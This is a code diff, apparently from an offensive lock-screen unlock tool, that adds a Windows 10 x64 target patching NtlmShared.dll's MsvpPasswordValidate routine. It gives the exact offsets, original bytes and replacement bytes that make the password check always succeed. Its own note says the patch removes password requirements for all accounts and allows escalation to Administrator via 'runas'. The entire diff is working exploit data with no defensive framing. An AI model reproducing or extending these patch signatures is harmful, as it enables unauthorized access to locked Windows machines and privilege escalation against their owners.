@@ -62,6 +62,32 @@ info = 'Unlocks the target\'s screensaver or lock screen. After running ' \
 
 targets = [
     Target(
+        name='Windows 10 MsvpPasswordValidate unlock/privilege escalation',
+        note='Ensures that the password-check always returns true. This will '
+        'cause all accounts to no longer require a password, and will '
+        'also allow you to escalate privileges to Administrator via the '
+        '\'runas\' command.',
+        signatures=[
+            Signature(
+                os='Windows 10',
+                os_versions=['10.0'],
+                os_architectures=['x64'],
+                executable='NtlmShared.dll',
+                version=None,
+                md5=None,
+                tag=False,
+                offsets=[0x14f],
+                chunks=[
+                    Chunk(
+                        chunk=0xc60f84,
+                        chunkoffset=0x00,
+                        patch=0xb001,
+                        patchoffset=0x07)
+                    ]
+                )
+            ]
+        ),
+        Target(
         name='Windows 8 MsvpPasswordValidate unlock/privilege escalation',
         note='Ensures that the password-check always returns true. This will '
         'cause all accounts to no longer require a password, and will '
